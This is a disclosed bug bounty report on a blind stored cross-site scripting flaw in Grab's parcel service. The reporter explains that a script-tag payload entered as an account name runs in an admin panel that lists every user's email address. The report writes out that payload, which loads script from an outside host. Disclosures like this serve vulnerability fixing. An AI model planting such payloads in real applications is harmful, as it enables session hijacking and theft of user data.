# Blind stored xss [parcel.grab.com] > name parameter 

## Report Details
- **Report ID**: 251224
- **URL**: https://hackerone.com/reports/251224
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-07-19T14:37:48.344Z
- **Disclosed**: 2017-09-14T11:41:24.572Z

## Reporter
- **Username**: paresh_parmar
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: grab

## Vulnerability Information
Hi,


___my previously reported blind xss is fixed but i found same type of xss in diffrent area with more impact.___


# Steps to repro:
1. create new account with name `"><script src=https://x.com></script>` here https://parcel.grab.com/
2.  afftected page is https://app.detrack.com/a/
where admin can see all the user's of application
and this is one more impact full because it contains all the user's email address. attacker can hijack all the information from there using xss
affeffcted page poc:
{F204498██████████
3. go here https://app.detrack.com/a/ and find ████████ , that is my account with xss payload.


thanks

## Attachments
No attachments
